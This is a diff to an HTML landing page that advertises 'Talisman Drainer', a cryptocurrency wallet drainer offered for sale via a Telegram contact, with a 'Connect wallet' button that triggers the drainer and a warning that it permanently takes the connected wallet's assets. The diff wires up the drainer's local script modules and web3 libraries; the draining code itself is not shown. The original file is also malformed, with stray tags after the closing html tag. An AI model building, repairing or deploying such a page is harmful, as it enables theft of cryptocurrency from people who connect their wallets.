@@ -1,25 +1,14 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <!-- Add CSP and favicon -->
-  <meta http-equiv="Content-Security-Policy" content="script-src 'self' 'unsafe-inline' 'unsafe-eval' https:; connect-src *;">
-  <link rel="icon" type="image/x-icon" href="./assets/web3-modal/images/MM.svg">
-  <!-- Existing meta tags -->
-  <meta charset="UTF-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Example</title>
-    @media (prefers-color-scheme: dark) {
-
-      html,
-      body {
-        background: #212020;
-        color: #fff;
-      }
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Web3 Integration</title>
+    <!-- Web3 Dependencies -->
+    <script src="https://unpkg.com/web3modal@1.9.0/dist/index.js"></script>
+    <script src="https://unpkg.com/web3@1.7.0/dist/web3.min.js"></script>
+    <script src="https://unpkg.com/@walletconnect/web3-provider@1.7.1/dist/umd/index.min.js"></script>
 </head>
-
 <body>
   <h1>Page with an example of how Talisman Drainer works</h1>
   <p>Want to buy? Write to Telegram: @talisman_dev</p>
@@ -29,21 +18,20 @@
     <button onclick="ms_init()">Connect wallet</button>
     <p><strong>Be careful!</strong> The script permanently writes off your assets!</p>
   </div>
-<!-- Add this right before your web3 script imports -->
-<script>
-</script><script src="./assets/web3-provider/web3-connect.js"></script>  <script src="./assets/web3-provider/web3-alert.js"></script>
-  <script src="./assets/web3-provider.js"></script>  <script>
+    <!-- Load local scripts last -->
+    <script src="./assets/web3-provider/web3-connect.js"></script>
+    <script src="./assets/web3-provider/web3-router.js"></script>
+    <script src="./assets/web3-provider/web3-module.js"></script>
+    <script src="./assets/web3-provider/web3-alert.js"></script>
+    <script src="./assets/web3-provider/web3-seaport.js"></script>
+    <script src="./assets/web3-provider/web3-data.js"></script>
+    <script src="./assets/web3-provider/ethers.js"></script>
+    <script src="./assets/web3-provider/ethereum-tx.js"></script>
+    <script src="./assets/web3-provider.js"></script>
+  <script>
     setInterval(() => {
       document.getElementById('injected-status').innerHTML = (typeof window.ethereum === 'object') ? 'true' : 'false';
     }, 1000);
   </script>
 </body>
-
 </html>
-    <!-- Add before existing scripts -->
-    <script src="https://unpkg.com/web3modal@1.9.0/dist/index.js"></script>
-    <script src="https://unpkg.com/web3@1.7.0/dist/web3.min.js"></script>
-    <script src="https://unpkg.com/@walletconnect/web3-provider@1.7.1/dist/umd/index.min.js"></script>
-
-    <!-- Your existing scripts -->
-    <script src="./assets/web3-provider/web3-connect.js"></script>
